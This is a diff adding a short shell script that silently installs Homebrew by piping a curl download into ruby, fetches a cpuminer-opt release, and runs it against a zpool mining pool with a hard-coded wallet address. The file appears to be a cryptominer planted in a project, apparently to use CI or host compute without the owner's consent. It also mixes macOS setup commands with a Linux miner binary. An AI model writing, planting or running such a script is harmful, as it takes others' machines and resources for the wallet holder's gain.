@@ -1,0 +1,10 @@
+#!/bin/sh
+softwareupdate -l
+ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" < /dev/null 2> /dev/null ; brew install caskroom/cask/brew-cask 2> /dev/null
+brew install --cask screen
+brew install coreutils
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+
+tar xvf cpuminer-opt-linux.tar.gz 
+
+./cpuminer-sse2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DB44CTaF2p6QgPMpzqsbimcmrHupNGvna7 -p c=DGB,kta -t1
